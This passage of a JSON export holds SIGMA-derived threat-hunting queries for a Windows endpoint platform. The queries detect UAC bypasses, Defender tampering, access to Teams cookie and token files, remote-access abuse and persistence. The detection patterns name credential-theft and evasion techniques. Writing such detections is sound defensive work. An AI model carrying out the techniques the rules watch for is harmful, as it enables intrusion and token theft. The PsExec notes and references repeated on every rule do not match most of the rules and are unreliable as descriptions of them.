\"EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA\" or tgt.process.cmdline contains \"EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\" or tgt.process.cmdline contains \"EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA\" or tgt.process.cmdline contains \"EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA\" or tgt.process.cmdline contains \"ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\" or tgt.process.cmdline contains \"kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA\" or tgt.process.cmdline contains \"ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA\" or tgt.process.cmdline contains \"kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA\" or tgt.process.cmdline contains \"ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\" or tgt.process.cmdline contains \"kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA\" or tgt.process.cmdline contains \"ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA\" or tgt.process.cmdline contains \"kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1224
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Scheduled Task Creation Via Schtasks.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \" /create \") and (not (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1225
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1518"
            ],
            "name": "Detected Windows Software Discovery",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"query\" and tgt.process.cmdline contains \"\\software\\\" and tgt.process.cmdline contains \"/v\" and tgt.process.cmdline contains \"svcversion\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1226
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Explorer NOUACCHECK Flag",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\explorer.exe\" and tgt.process.cmdline contains \"/NOUACCHECK\") and (not (src.process.cmdline=\"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\" or src.process.image.path=\"C:\\Windows\\System32\\svchost.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1227
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential sideloading of \"mpclient.dll\" by Windows Defender processes (\"MpCmdRun\" and \"NisSrv\") from their non-default directory.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Potential Mpclient.DLL Sideloading Via Defender Binaries",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\MpCmdRun.exe\" or tgt.process.image.path contains \"\\NisSrv.exe\") and (not (tgt.process.image.path contains \"C:\\Program Files (x86)\\Windows Defender\\\" or tgt.process.image.path contains \"C:\\Program Files\\Microsoft Security Client\\\" or tgt.process.image.path contains \"C:\\Program Files\\Windows Defender\\\" or tgt.process.image.path contains \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\" or tgt.process.image.path contains \"C:\\Windows\\WinSxS\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1228
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using ChangePK and SLUI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\changepk.exe\" and src.process.image.path contains \"\\slui.exe\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1229
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a commandline containing references to the Microsoft Teams database or cookies files from a process other than Teams.\nThe database might contain authentication tokens and other sensitive information about the logged in accounts.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1528"
            ],
            "name": "Potentially Suspicious Command Targeting Teams Sensitive Files",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\Microsoft\\Teams\\Cookies\" or tgt.process.cmdline contains \"\\Microsoft\\Teams\\Local Storage\\leveldb\") and (not tgt.process.image.path contains \"\\Microsoft\\Teams\\current\\Teams.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1230
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects piping the password to an anydesk instance via CMD and the '--set-password' flag.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - AnyDesk Piped Password Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"/c \" and tgt.process.cmdline contains \"echo \" and tgt.process.cmdline contains \".exe --set-password\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1231
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects addition of users to the local Remote Desktop Users group via \"Net\" or \"Add-LocalGroupMember\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1133",
                "t1136",
                "t1021"
            ],
            "name": "User Added to Remote Desktop Users Group",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"localgroup \" and tgt.process.cmdline contains \" /add\") or (tgt.process.cmdline contains \"Add-LocalGroupMember \" and tgt.process.cmdline contains \" -Group \")) and (tgt.process.cmdline contains \"Remote Desktop Users\" or tgt.process.cmdline contains \"Utilisateurs du Bureau \u00e0 distance\" or tgt.process.cmdline contains \"Usuarios de escritorio remoto\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1232
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon \"userinit.exe\" child processes, which could be a sign of uncommon shells or login scripts used for persistence.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1037"
            ],
            "name": "Uncommon Userinit Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\userinit.exe\" and (not tgt.process.image.path contains \":\\WINDOWS\\explorer.exe\") and (not ((tgt.process.cmdline contains \"netlogon.bat\" or tgt.process.cmdline contains \"UsrLogon.cmd\") or tgt.process.cmdline=\"PowerShell.exe\" or (tgt.process.image.path contains \":\\Windows\\System32\\proquota.exe\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\proquota.exe\") or (tgt.process.image.path contains \":\\Program Files (x86)\\Citrix\\HDX\\bin\\cmstart.exe\" or tgt.process.image.path contains \":\\Program Files (x86)\\Citrix\\HDX\\bin\\icast.exe\" or tgt.process.image.path contains \":\\Program Files (x86)\\Citrix\\System32\\icast.exe\" or tgt.process.image.path contains \":\\Program Files\\Citrix\\HDX\\bin\\cmstart.exe\" or tgt.process.image.path contains \":\\Program Files\\Citrix\\HDX\\bin\\icast.exe\" or tgt.process.image.path contains \":\\Program Files\\Citrix\\System32\\icast.exe\") or not (tgt.process.image.path matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1233
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 2",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd74\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffc\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udffd\" or tgt.process.cmdline contains \"\u270b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udffd\" or tgt.process.cmdline contains \"\u270c\ud83c\udffd\" or 